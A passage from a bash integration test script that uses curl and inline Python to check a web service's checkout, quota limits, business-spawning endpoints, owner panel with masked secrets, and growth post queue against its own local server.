CO=$(curl -s -X POST "$BASE/api/checkout" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"tier\":\"pro\"}")
echo "$CO" | grep -q '"checkout_url"' || fail "checkout returns url: $CO"
echo "$CO" | grep -q '"pending_manual"' || fail "manual provider default: $CO"
grep -q "$NODE" "$DIR/data/intents.jsonl" || fail "intent logged to intents.jsonl"
curl -s -X POST "$BASE/api/checkout" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"tier\":\"gold\"}" | grep -q '"error"' || fail "bad tier must 400"
curl -s -X POST "$BASE/api/stripe-webhook" -H 'Content-Type: application/json' -d '{}' | grep -q '"error"' || fail "webhook unconfigured must 400"
# paywall surfaces carry the same test contract: all live traffic today is
# test-flagged, so assert shape on the audit surface.
curl -s "$BASE/api/leaderboard?include_test=1" | grep -q '"referral_credit"' || fail "leaderboard referral credit"
curl -s "$BASE/api/leaderboard?include_test=1" | grep -q '"payout"' || fail "leaderboard payout trigger"
curl -s "$BASE/dataset/product-prices" | grep -qi "Go Pro" || fail "dataset page price card"
curl -s "$BASE/" | grep -qi "quota" || fail "dashboard quota bar"
# --- per-card refresh isolation (anon quota exhausted must not blank the page) ---
grep -q "if(!r.ok)" "$DIR/public/index.html" || fail "api() must reject on HTTP error"
grep -q "async function step(fn)" "$DIR/public/index.html" || fail "refresh step() guard missing"
grep -q "await step(loadRecords)" "$DIR/public/index.html" || fail "loadRecords not isolated"
grep -q "await step(loadGrowth)" "$DIR/public/index.html" || fail "loadGrowth not isolated"
grep -q "await step(loadGaps)" "$DIR/public/index.html" || fail "loadGaps not isolated"
grep -q "sign in for live records" "$DIR/public/index.html" || fail "quota-honest card message missing"
# unmetered cards keep serving logged-out visitors even when anon quota is spent
curl -s "$BASE/api/gaps" | grep -q '"gaps"' || fail "gaps serve while anon throttled"
curl -s "$BASE/api/growth/queue" | grep -q '"posts"' || fail "growth queue serve while anon throttled"
# 429 path stays honest: burn a throwaway token bucket, shape must be quota body
QW=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot-quota"}')
QWNODE=$(echo "$QW" | python3 -c "import json,sys;print(json.load(sys.stdin)['node_id'])")
QWTOK=$(echo "$QW" | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")
for i in $(seq 1 105); do curl -s -o /dev/null "$BASE/api/records?limit=1&token=$QWTOK"; done
QWST=$(curl -s -o /tmp/qw429.json -w "%{http_code}" -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36" "$BASE/api/records?limit=1&token=$QWTOK")
QWB=$(cat /tmp/qw429.json)
[ "$QWST" = "429" ] || fail "throwaway bucket must HTTP 429, got $QWST: $QWB"
echo "$QWB" | grep -q 'quota exhausted' || fail "throwaway bucket must 429: $QWB"
echo "$QWB" | grep -q '"quota_used"' || fail "429 carries quota_used: $QWB"
echo "$QWB" | grep -q '"upgrade"' || fail "429 carries upgrade hint: $QWB"
# key-holders still read fine while anon bucket is spent
curl -s "$BASE/api/records?limit=1&token=$TOKEN&include_test=1" | grep -q "Check Widget" || fail "token reads survive anon exhaustion (audit)"
PUBCAP=$(curl -s -X POST "$BASE/api/publish" -H 'Content-Type: application/json' -d "{\"dataset\":\"check-extra-$NONCE\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}")
echo "$PUBCAP" | grep -q '"upgrade"' || fail "second dataset on free must 403+upgrade: $PUBCAP"
# --- business spawner asserts (one-button spawn -> list/suggest -> delete) ---
SPN=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot-spawner"}')
SPNODE=$(echo "$SPN" | python3 -c "import json,sys;print(json.load(sys.stdin)['node_id'])")
SPTOK=$(echo "$SPN" | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")
curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d '{"niche":"check widgets"}' | grep -q '"error"' || fail "unauth spawn must fail"
curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$SPNODE\",\"token\":\"$SPTOK\",\"niche\":\"\"}" | grep -q '"error"' || fail "empty niche must 400"
LONG=$(python3 -c "print('n'*121)")
curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$SPNODE\",\"token\":\"$SPTOK\",\"niche\":\"$LONG\"}" | grep -q '"error"' || fail ">120 niche must 400"
SP1=$(curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$SPNODE\",\"token\":\"$SPTOK\",\"niche\":\"check spawned widgets $NONCE\"}")
echo "$SP1" | grep -q '"business_id"' || fail "spawn: $SP1"
for k in business_id name public_url api_url dataset_id recipe_id growth_posts_queued referral_code quota_tier; do echo "$SP1" | grep -q "\"$k\"" || fail "spawn missing $k: $SP1"; done
SPBID=$(echo "$SP1" | python3 -c "import json,sys;print(json.load(sys.stdin)['business_id'])")
SPDS=$(echo "$SP1" | python3 -c "import json,sys;print(json.load(sys.stdin)['dataset_id'])")
SPRID=$(echo "$SP1" | python3 -c "import json,sys;print(json.load(sys.stdin)['recipe_id'])")
curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$SPNODE\",\"token\":\"$SPTOK\",\"niche\":\"check spawned widgets $NONCE\"}" | grep -q '"business_id"' || fail "duplicate niche must 409 with business_id"
curl -s "$BASE/api/public/$SPDS?include_test=1" | grep -q "check spawned widgets" || fail "spawned API live (audit)"
curl -s "$BASE/api/public/$SPDS" | grep -q 'no honest rows' || fail "test-spawned API hidden by default"
curl -s "$BASE/api/businesses?include_test=1" | grep -q "$SPBID" || fail "list shows spawn (audit)"
curl -s "$BASE/api/businesses" | grep -q "$SPBID" && fail "test spawn leaked into public list"
SG=$(curl -s "$BASE/api/businesses/suggest")
echo "$SG" | python3 -c "import json,sys;d=json.load(sys.stdin);s=d['suggest'];assert len(s)==3,s;assert all(x['niche'] and x['why'] and x['first_customer'] and x['spawn_call']['body'].get('niche') for x in s),s;print('suggest OK:',[x['niche'][:40] for x in s])" || fail "suggest: $SG"
SPN2=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot-spawner2"}')
SPNODE2=$(echo "$SPN2" | python3 -c "import json,sys;print(json.load(sys.stdin)['node_id'])")
SPTOK2=$(echo "$SPN2" | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")
SP2=$(curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$SPNODE2\",\"token\":\"$SPTOK2\",\"idea_id\":\"product-prices:0\"}")
echo "$SP2" | grep -q '"business_id"' || fail "spawn from idea_id: $SP2"
SP2BID=$(echo "$SP2" | python3 -c "import json,sys;print(json.load(sys.stdin)['business_id'])")
SP2DS=$(echo "$SP2" | python3 -c "import json,sys;print(json.load(sys.stdin)['dataset_id'])")
CAPN=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot-spawncap"}')
CAPNODE=$(echo "$CAPN" | python3 -c "import json,sys;print(json.load(sys.stdin)['node_id'])")
CAPTOK=$(echo "$CAPN" | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")
CAPNODE_X="$CAPNODE" python3 -c "import json,os;p='$DIR/data/auth.json';d=json.load(open(p));d['nodes'][os.environ['CAPNODE_X']]['tier']='pro';json.dump(d,open(p,'w'),indent=1);print('cap node -> pro')" || fail "cap node tier flip"
for i in 1 2 3; do curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$CAPNODE\",\"token\":\"$CAPTOK\",\"niche\":\"cap test $NONCE $i\"}" | grep -q '"business_id"' || fail "cap spawn $i"; done
curl -s -X POST "$BASE/api/businesses/spawn" -H 'Content-Type: application/json' -d "{\"node_id\":\"$CAPNODE\",\"token\":\"$CAPTOK\",\"niche\":\"cap test $NONCE 4\"}" | grep -q '"error"' || fail "4th spawn must 429"
for CB in $(curl -s "$BASE/api/businesses?include_test=1" | python3 -c "import json,sys;d=json.load(sys.stdin);print(' '.join(b['business_id'] for b in d['businesses'] if b.get('owner')=='$CAPNODE'))"); do curl -s -X DELETE "$BASE/api/businesses/$CB?node_id=$CAPNODE&token=$CAPTOK" | grep -q '"ok"' || fail "cap cleanup $CB"; done
curl -s -X DELETE "$BASE/api/businesses/$SPBID?node_id=$SPNODE&token=wrong" | grep -q '"error"' || fail "wrong-token delete must fail"
DEL=$(curl -s -X DELETE "$BASE/api/businesses/$SPBID?node_id=$SPNODE&token=$SPTOK")
echo "$DEL" | grep -q '"ok": *true' || fail "delete: $DEL"
echo "$DEL" | python3 -c "import json,sys;d=json.load(sys.stdin);c=d['cleaned'];assert c['published'] and c['recipe'] and c['seed_rows']>=1 and c['posts']==7,c;print('cleanup OK:',c)" || fail "delete cleanup shape: $DEL"
curl -s "$BASE/api/public/$SPDS" | grep -q '"error"' || fail "unpublished dataset must 404"
curl -s "$BASE/api/recipes" | grep -q "$SPRID" && fail "recipe not removed"
curl -s "$BASE/api/businesses?include_test=1" | grep -q "$SPBID" && fail "business still listed"
curl -s -X DELETE "$BASE/api/businesses/$SP2BID?node_id=$SPNODE2&token=$SPTOK2" | grep -q '"ok"' || fail "delete idea-spawn"
curl -s "$BASE/api/public/$SP2DS" | grep -q '"error"' || fail "idea-spawn dataset must 404 after delete"
# --- calm + web-complete asserts: brief hero, owner panel, masked secrets ---
OWNER=$(python3 -c "import json;print(json.load(open('$DIR/needs.json')).get('owner_token',''))")
[ -n "$OWNER" ] || fail "owner_token minted in needs.json"
BRIEF=$(curl -s "$BASE/api/brief")
echo "$BRIEF" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['headline']['value'] is not None and d['headline']['label'],d;assert 'While you were away' in d['away_line'],d;assert all(k in d for k in ('signups_today','earned_today','posts_out','visits','paid')),d;print('brief OK:',d['headline'],'|',d['away_line'])" || fail "brief: $BRIEF"
# owner status: locked without/wrong token, masked with master token
curl -s "$BASE/api/owner/status" | grep -q 'owner locked' || fail "owner status must 401 without token"
curl -s "$BASE/api/owner/status?owner_token=wrong" | grep -q 'owner locked' || fail "owner status must 401 with wrong token"
OST=$(curl -s "$BASE/api/owner/status?owner_token=$OWNER")
echo "$OST" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['ok'] and d['channel'] in ('dryrun','x_api'),d;assert isinstance(d['bearer_set'],bool) and isinstance(d['stripe_set'],bool),d;assert 'queue' in d and 'outbox' in d and 'intents_pending' in d and 'payouts_pending' in d,d;assert 'tiers' in d,d;print('owner status OK: channel',d['channel'],'pending',len(d['queue']['pending']))" || fail "owner status: $OST"
# master token must never appear in any GET
for EP in "/api/config" "/api/brief" "/api/owner/status?owner_token=$OWNER"; do
  curl -s "$BASE$EP" | grep -q "$OWNER" && fail "owner token leaked in GET $EP"
done
# write-only keys: set fixture X bearer, prove masked + 0600 + channel flip
FIX_X="xbro_test_fixture_$(date +%s)"
KX=$(curl -s -X POST "$BASE/api/owner/keys" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"x_bearer_token\":\"$FIX_X\"}")
echo "$KX" | grep -q '"ok": *true' || fail "owner keys set: $KX"
echo "$KX" | grep -q "$FIX_X" && fail "owner/keys echoed the secret back"
curl -s "$BASE/api/owner/status?owner_token=$OWNER" | grep -q "$FIX_X" && fail "secret leaked in owner status"
curl -s "$BASE/api/config" | grep -q "$FIX_X" && fail "secret leaked in config"
python3 -c "import os;st=os.stat('$DIR/data/secrets.json');assert oct(st.st_mode & 0o777)=='0o600',oct(st.st_mode);print('secrets 0600 OK')" || fail "secrets file must be 0600"
CF=$(curl -s -X POST "$BASE/api/owner/config" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"growth_channel\":\"x_api\"}")
echo "$CF" | grep -q '"growth_channel": *"x_api"' || fail "channel flip to x_api: $CF"
curl -s "$BASE/api/growth/stats" | grep -q '"channel": *"x_api"' || fail "channel live in stats"
# dryrun-safe self-test: outbox grows, queue posted-count does NOT
P0=$(curl -s "$BASE/api/owner/status?owner_token=$OWNER" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d['queue']['posted'])")
TST=$(curl -s -X POST "$BASE/api/owner/growth/test" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\"}")
echo "$TST" | grep -q '"status": *"selftest"' || fail "selftest: $TST"
echo "$TST" | grep -q '"backend": *"dryrun"' || fail "selftest must be dryrun even on x_api: $TST"
P1=$(curl -s "$BASE/api/owner/status?owner_token=$OWNER" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d['queue']['posted'])")
[ "$P0" = "$P1" ] || fail "selftest must not mark queue posted ($P0 -> $P1)"
tail -n 1 "$DIR/data/outbox.jsonl" | grep -q 'selftest' || fail "selftest row in outbox"
# back to dryrun + clear fixture key (empty string clears)
curl -s -X POST "$BASE/api/owner/config" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"growth_channel\":\"dryrun\"}" | grep -q '"growth_channel": *"dryrun"' || fail "channel flip back"
curl -s -X POST "$BASE/api/owner/keys" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"x_bearer_token\":\"\"}" | grep -q '"ok": *true' || fail "clear fixture key"
curl -s "$BASE/api/owner/status?owner_token=$OWNER" | grep -q '"bearer_set": *false' || fail "bearer cleared"
# stripe fixture: provider flips live, nothing echoed, then cleared
FIX_SK="sk_test_fixture_$(date +%s)"
KS=$(curl -s -X POST "$BASE/api/owner/keys" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"stripe_secret\":\"$FIX_SK\"}")
echo "$KS" | grep -q '"ok": *true' || fail "stripe key set: $KS"
echo "$KS" | grep -q "$FIX_SK" && fail "stripe key echoed"
curl -s "$BASE/api/config" | grep -q "$FIX_SK" && fail "stripe leaked in config"
curl -s "$BASE/api/owner/status?owner_token=$OWNER" | grep -q "$FIX_SK" && fail "stripe leaked in status"
python3 - "$DIR" <<'EOF' || fail "stripe provider flip"
import sys; sys.path.insert(0, sys.argv[1] + "/server"); import app
assert app.checkout_provider() == "stripe", app.checkout_provider()
print("provider stripe OK")
EOF
curl -s -X POST "$BASE/api/owner/keys" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"stripe_secret\":\"\"}" | grep -q '"ok": *true' || fail "clear stripe fixture"
python3 - "$DIR" <<'EOF' || fail "provider back to manual"
import sys; sys.path.insert(0, sys.argv[1] + "/server"); import app
assert app.checkout_provider() == "manual", app.checkout_provider()
print("provider manual OK")
EOF
# tier price edits live immediately, then restored; bad values 400
TC=$(curl -s -X POST "$BASE/api/owner/config" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"tiers\":{\"free\":{\"api_calls_per_day\":111},\"pro\":{\"price_usd\":10}}}")
echo "$TC" | grep -q '"ok": *true' || fail "tier edit: $TC"
curl -s "$BASE/api/config" | grep -q '"api_calls_per_day": *111' || fail "free quota live in config"
curl -s "$BASE/api/me?node_id=$NODE&token=$TOKEN" | grep -q '"quota_limit": *111' || fail "free quota live in /api/me"
curl -s -X POST "$BASE/api/owner/config" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"tiers\":{\"free\":{\"api_calls_per_day\":100},\"pro\":{\"price_usd\":9}}}" | grep -q '"ok": *true' || fail "tier restore"
curl -s -X POST "$BASE/api/owner/config" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"growth_channel\":\"bogus\"}" | grep -q '"error"' || fail "bad channel must 400"
curl -s -X POST "$BASE/api/owner/config" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"tiers\":{\"pro\":{\"price_usd\":-5}}}" | grep -q '"error"' || fail "negative price must 400"
curl -s -X POST "$BASE/api/owner/keys" -H 'Content-Type: application/json' -d '{"owner_token":"wrong","x_bearer_token":"x"}' | grep -q '"error"' || fail "owner keys must 401 with wrong token"
# growth reject roundtrip on a future post (approve restores exact state)
RJID=$(curl -s "$BASE/api/growth/queue" | python3 -c "import json,sys;ps=[p for p in json.load(sys.stdin)['posts'] if not p.get('posted')];print(ps[-1]['id'])")
curl -s -X POST "$BASE/api/growth/reject" -H 'Content-Type: application/json' -d "{\"id\":\"$RJID\"}" | grep -q '"error"' || fail "unauth reject must fail"
curl -s -X POST "$BASE/api/growth/reject" -H 'Content-Type: application/json' -d "{\"id\":\"no-such-post\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}" | grep -q 'not found' || fail "reject bad id must 404"
REJ=$(curl -s -X POST "$BASE/api/growth/reject" -H 'Content-Type: application/json' -d "{\"id\":\"$RJID\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}")
echo "$REJ" | grep -q '"rejected": *true' || fail "reject: $REJ"
curl -s "$BASE/api/growth/queue" | python3 -c "import json,sys;ps={p['id']:p for p in json.load(sys.stdin)['posts']};assert ps['$RJID']['rejected'] is True and ps['$RJID']['approved'] is False,ps['$RJID'];print('reject persisted OK')" || fail "reject persisted"
# rejected posts are never due: crafted-queue tick proof (backups restored)
python3 - "$DIR" <<'EOF' || fail "rejected excluded from tick"
import sys, json, shutil
sys.path.insert(0, sys.argv[1] + "/server"); import app
qp, op, gp = app.growth_paths()
for f in (qp, op, gp):
    shutil.copy(f, f + ".calm-bak")
try:
    open(op, "w").close()  # empty tray: only today's post is due
    q = app.build_growth_queue()
    q["posts"][0]["approved"] = True
    q["posts"][0]["rejected"] = True  # the ONLY due post is parked
    app.save_json(qp, q)
    rec = app.growth_tick()
    assert rec.get("status") == "nothing-due", rec
    assert app.load_lines(op) == [], "rejected post leaked into tray!"
    print("tick exclusion OK: sole due post rejected -> nothing-due, tray empty")
    q2 = app.get_growth_queue()  # same post, now approved, must go out
    q2["posts"][0]["approved"] = True
    q2["posts"][0]["rejected"] = False
    app.save_json(qp, q2)
    rec2 = app.growth_tick()
    assert rec2.get("id") == q2["posts"][0]["id"] and rec2.get("posted"), rec2
    print("tick eligibility OK: approved ->", rec2.get("id"), rec2.get("status"))
finally:
    for f in (qp, op, gp):
        shutil.move(f + ".calm-bak", f)
print("queue/outbox/log restored")
EOF
APR2=$(curl -s -X POST "$BASE/api/growth/approve" -H 'Content-Type: application/json' -d "{\"id\":\"$RJID\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}")
echo "$APR2" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['approved'] is True and d.get('rejected') is False,d;print('approve-after-reject OK')" || fail "approve restore: $APR2"
# manual payout review: checkout intent -> owner approve flips tier -> 409 replay -> state restored
if [ -f "$DIR/data/intents.jsonl" ]; then cp "$DIR/data/intents.jsonl" "$DIR/data/intents.jsonl.calm-bak"; else rm -f "$DIR/data/intents.jsonl.calm-bak"; fi
if [ -f "$DIR/data/decisions.jsonl" ]; then cp "$DIR/data/decisions.jsonl" "$DIR/data/decisions.jsonl.calm-bak"; else rm -f "$DIR/data/decisions.jsonl.calm-bak"; fi
CO2=$(curl -s -X POST "$BASE/api/checkout" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"tier\":\"pro\"}")
echo "$CO2" | grep -q 'pending_manual' || fail "manual checkout: $CO2"
IDX=$(($(wc -l < "$DIR/data/intents.jsonl") - 1))
curl -s "$BASE/api/owner/status?owner_token=$OWNER" | python3 -c "import json,sys;d=json.load(sys.stdin);assert any(x['node_id']=='$NODE' for x in d['intents_pending']),d['intents_pending'];print('intent queued OK')" || fail "intent in review queue"
DEC=$(curl -s -X POST "$BASE/api/owner/intents/decide" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"index\":$IDX,\"approve\":true}")
echo "$DEC" | grep -q '"tier": *"pro"' || fail "intent approve flips tier: $DEC"
curl -s "$BASE/api/me?node_id=$NODE&token=$TOKEN" | grep -q '"tier": *"pro"' || fail "me shows pro after approval"
curl -s -X POST "$BASE/api/owner/intents/decide" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"index\":$IDX,\"approve\":true}" | grep -q 'already decided' || fail "replay must 409"
if [ -f "$DIR/data/intents.jsonl.calm-bak" ]; then cp "$DIR/data/intents.jsonl.calm-bak" "$DIR/data/intents.jsonl"; fi
if [ -f "$DIR/data/decisions.jsonl.calm-bak" ]; then cp "$DIR/data/decisions.jsonl.calm-bak" "$DIR/data/decisions.jsonl"; else rm -f "$DIR/data/decisions.jsonl"; fi
rm -f "$DIR/data/intents.jsonl.calm-bak" "$DIR/data/decisions.jsonl.calm-bak"
python3 - "$DIR" "$NODE" <<'EOF' || fail "tier demote after intent test"
import sys; sys.path.insert(0, sys.argv[1] + "/server"); import app
assert app.set_node_tier(sys.argv[2], "free"), "demote"
print("tier restored to free")
EOF
curl -s "$BASE/api/me?node_id=$NODE&token=$TOKEN" | grep -q '"tier": *"free"' || fail "tier back to free"
# referral-credit review on the audit surface (decision artifact restored after)
if [ -f "$DIR/data/decisions.jsonl" ]; then cp "$DIR/data/decisions.jsonl" "$DIR/data/decisions.jsonl.calm-bak"; else rm -f "$DIR/data/decisions.jsonl.calm-bak"; fi
RICH=$(curl -s "$BASE/api/leaderboard?include_test=1" | python3 -c "import json,sys;ls=[x for x in json.load(sys.stdin)['leaders'] if x.get('referral_credit',0)>0];print(ls[0]['node_id'] if ls else '')")
if [ -n "$RICH" ]; then
  PD=$(curl -s -X POST "$BASE/api/owner/payouts/decide" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"referrer\":\"$RICH\",\"approve\":true}")
  echo "$PD" | grep -q '"approved": *true' || fail "payout approve: $PD"
  curl -s "$BASE/api/leaderboard?include_test=1" | python3 -c "import json,sys;ls={x['node_id']:x for x in json.load(sys.stdin)['leaders']};assert ls['$RICH']['payout_status']=='paid',ls['$RICH'];print('payout paid OK')" || fail "leaderboard shows paid"
  if [ -f "$DIR/data/decisions.jsonl.calm-bak" ]; then cp "$DIR/data/decisions.jsonl.calm-bak" "$DIR/data/decisions.jsonl"; else rm -f "$DIR/data/decisions.jsonl"; fi
  echo "payout decision test artifact restored"
else
  echo "note: no credited referrer on audit surface — payout decide shape only"
  curl -s -X POST "$BASE/api/owner/payouts/decide" -H 'Content-Type: application/json' -d "{\"owner_token\":\"$OWNER\",\"referrer\":\"no-such-node\",\"approve\":true}" | grep -q 'not found' || fail "payout bad referrer must 404"
fi
rm -f "$DIR/data/decisions.jsonl.calm-bak"
# calm landing: hero + drawers, plain words, old powers still present
curl -s "$BASE/" | python3 -c "import sys,subprocess;h=sys.stdin.read();js=h.split('<script>')[1].split('</script>')[0];open('/tmp/calm-page.js','w').write(js)" || fail "extract landing script"
node --check /tmp/calm-page.js || fail "landing JS must parse"
curl -s "$BASE/" | grep -q 'id="heroNum"' || fail "hero number"
curl -s "$BASE/" | grep -q 'id="heroAct"' || fail "hero single button"
curl -s "$BASE/" | grep -q 'id="awayLine"' || fail "away line"
curl -s "$BASE/" | grep -q 'id="secOwner"' || fail "owner drawer"
curl -s "$BASE/" | grep -q 'posting tray' || fail "plain word: posting tray"
curl -s "$BASE/" | grep -qi 'send in' || fail "plain word: send in"
curl -s "$BASE/" | grep -q 'Get token' || fail "landing has one-click token"
curl -s "$BASE/" | grep -q 'Show last capture' || fail "landing has proof button"
curl -s "$BASE/" | grep -q 'Generate from sample' || fail "landing has AI-prefill"
curl -s "$BASE/" | grep -q 'CLIENT' || fail "landing shows WHERE badge"
curl -s "$BASE/" | grep -q 'Install extension' || fail "install card on first paint"
curl -s "$BASE/" | grep -q 'download/extension.zip' || fail "landing links the zip"
curl -s "$BASE/" | grep -qi 'quota' || fail "quota surfaced"
curl -s "$BASE/" | grep -q 'secGrowth' || fail "Growth card"
# --- calm wire-up asserts: spawn card + owner drawer controls, zero shell ---
curl -s "$BASE/" | grep -q 'id="secSpawn"' || fail "spawn card wired"
curl -s "$BASE/" | grep -q 'Spawn this business' || fail "spawn buttons"
curl -s "$BASE/" | grep -q 'businesses/suggest' || fail "suggest fetch wired"
curl -s "$BASE/" | grep -q 'businesses/spawn' || fail "spawn fetch wired"
curl -s "$BASE/" | grep -q 'id="bizList"' || fail "business list"
curl -s "$BASE/" | grep -q 'data-biz-del' || fail "business delete"
curl -s "$BASE/" | grep -q 'id="secOwner"' || fail "owner drawer"
curl -s "$BASE/" | grep -q 'id="oXKey"' || fail "owner X key paste"
curl -s "$BASE/" | grep -q 'id="oChannel"' || fail "owner channel flip"
curl -s "$BASE/" | grep -q 'id="oFreeCalls"' || fail "owner tier price edits"
curl -s "$BASE/" | grep -q 'id="oProPrice"' || fail "owner pro price edit"
curl -s "$BASE/" | grep -q 'data-act="intent-ok"' || fail "owner payout review"
curl -s "$BASE/" | grep -q 'data-act="payout-ok"' || fail "owner bonus review"
curl -s "$BASE/api/businesses/suggest" | python3 -c "import json,sys;d=json.load(sys.stdin);assert len(d['suggest'])==3,d;print('suggest 3 OK')" || fail "suggest renders 3 niches"
# --- loop hands asserts (gaps backlog + loop drafts: file -> attribute -> clean) ---
# unauth writes must fail; bad bodies must 400; artifacts carry source marks;
# drafts never auto-post (approved=false even with growth_auto_approve=true).
HANDNODE="$NODE"
HANDTOK="$TOKEN"
curl -s -X POST "$BASE/api/gaps" -H 'Content-Type: application/json' -d '{"item":"x"}' | grep -q '"error"' || fail "unauth gap file must fail"
curl -s -X POST "$BASE/api/growth/draft" -H 'Content-Type: application/json' -d '{"text":"x"}' | grep -q '"error"' || fail "unauth draft must fail"
curl -s -X POST "$BASE/api/gaps" -H 'Content-Type: application/json' -d "{\"node_id\":\"$HANDNODE\",\"token\":\"$HANDTOK\",\"item\":\"\",\"evidence\":\"y\"}" | grep -q '"error"' || fail "empty gap item must 400"
curl -s -X POST "$BASE/api/growth/draft" -H 'Content-Type: application/json' -d "{\"node_id\":\"$HANDNODE\",\"token\":\"$HANDTOK\",\"text\":\"\"}" | grep -q '"error"' || fail "empty draft text must 400"
GAPTS="$(date +%s)"
GAP=$(curl -s -X POST "$BASE/api/gaps" -H 'Content-Type: application/json' -d "{\"node_id\":\"$HANDNODE\",\"token\":\"$HANDTOK\",\"item\":\"hands check gap $GAPTS\",\"evidence\":\"check.sh fixture: publishes stalled at 11\",\"priority\":\"high\",\"test\":true}")
echo "$GAP" | grep -q '"source": *"e082-loop"' || fail "gap source mark: $GAP"
echo "$GAP" | grep -q '"priority": *"high"' || fail "gap priority: $GAP"
GAPID=$(echo "$GAP" | python3 -c "import json,sys;print(json.load(sys.stdin)['id'])")
[ -n "$GAPID" ] || fail "gap id empty"
curl -s "$BASE/api/gaps" | grep -q "$GAPID" && fail "test gap leaked into public list"
curl -s "$BASE/api/gaps?include_test=1" | grep -q "$GAPID" || fail "gap audit surface"
# a live e082-loop draft may be pending (daemon ticks every 60s and re-queues
# whenever suite ingests grow records); clear unposted ones so the fixture below is ours
for PEND in $(curl -s "$BASE/api/growth/queue" | python3 -c "import json,sys;print(' '.join(p['id'] for p in json.load(sys.stdin)['posts'] if p.get('source')=='loop' and not p.get('posted')))"); do
  curl -s -X DELETE "$BASE/api/growth/draft?id=$PEND&node_id=$HANDNODE&token=$HANDTOK" | grep -q '"ok": *true' || fail "clear pending loop draft $PEND"
done
DRAFT=$(curl -s -X POST "$BASE/api/growth/draft" -H 'Content-Type: application/json' -d "{\"node_id\":\"$HANDNODE\",\"token\":\"$HANDTOK\",\"text\":\"Hands check draft $GAPTS: product-prices live at http://x/?ref=growth\",\"link\":\"http://x/?ref=growth\",\"fact\":\"fixture fact\"}")
echo "$DRAFT" | grep -q '"source": *"loop"' || fail "draft source mark: $DRAFT"
echo "$DRAFT" | grep -q '"approved": *false' || fail "draft must NOT auto-post: $DRAFT"
DRAFTID=$(echo "$DRAFT" | python3 -c "import json,sys;print(json.load(sys.stdin)['id'])")
[ -n "$DRAFTID" ] || fail "draft id empty"
curl -s "$BASE/api/growth/queue" | grep -q "$DRAFTID" || fail "draft in queue"
curl -s "$BASE/api/growth/stats" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['loop_pending']>=1,d;print('loop draft pending OK')" || fail "loop_pending stat"
# second draft while one waits returns the waiting one (no queue spam)
DRAFT2=$(curl -s -X POST "$BASE/api/growth/draft" -H 'Content-Type: application/json' -d "{\"node_id\":\"$HANDNODE\",\"token\":\"$HANDTOK\",\"text\":\"second Hands check draft $GAPTS\"}")
echo "$DRAFT2" | python3 -c "import json,sys;assert json.load(sys.stdin)['id']=='$DRAFTID';print('draft dedupe OK')" || fail "draft dedupe: $DRAFT2"
# dashboard attribution: LOOP badges render
curl -s "$BASE/" | grep -q 'secGaps' || fail "dashboard gaps card"
curl -s "$BASE/" | grep -q 'LOOP' || fail "dashboard LOOP badge"
# cleanup: delete both (node token may delete test gap + unposted draft)
curl -s -X DELETE "$BASE/api/growth/draft?id=$DRAFTID&node_id=$HANDNODE&token=$HANDTOK" | grep -q '"ok": *true' || fail "draft delete"
curl -s -X DELETE "$BASE/api/gaps?id=$GAPID&node_id=$HANDNODE&token=$HANDTOK" | grep -q '"ok": *true' || fail "gap delete"
curl -s "$BASE/api/gaps?include_test=1" | grep -q "$GAPID" && fail "gap not deleted"
curl -s "$BASE/api/growth/queue" | grep -q "$DRAFTID" && fail "draft not deleted"
echo "hands endpoints OK (filed $GAPID + $DRAFTID, attributed, cleaned)"
# --- REAL-DATA collector asserts (loop-driven, no keys, re-pullable) ---
# CoinGecko first (single try, cached >=5min, 429 backs off), Coinbase/Kraken
